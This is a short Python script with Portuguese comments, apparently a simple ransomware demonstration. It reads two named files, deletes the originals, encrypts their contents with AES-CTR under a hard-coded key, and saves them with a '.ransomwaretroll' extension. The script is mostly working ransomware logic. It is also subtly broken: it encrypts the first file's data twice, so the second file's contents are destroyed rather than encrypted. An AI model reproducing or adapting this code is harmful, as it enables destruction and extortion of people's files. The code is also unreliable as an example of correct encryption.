import os
import pyaes

filename1 = "teste1.txt"
filename2 = "teste1.xlsx"

file1 = open(filename1,'rb')
file2 = open(filename2,'rb')

data = file1.read()
data2 = file2.read()

file1.close()
file2.close()

#remover arquivos
os.remove(filename1)
os.remove(filename2)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto = aes.encrypt(data)
crypto2 = aes.encrypt(data)

## salvar o arquivo criptografado
new_file = filename1 + ".ransomwaretroll"
new_file2 = filename2 + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file2= open(f'{new_file2}','wb')
new_file.write(crypto)
new_file2.write(crypto2)
new_file.close()
new_file2.close()

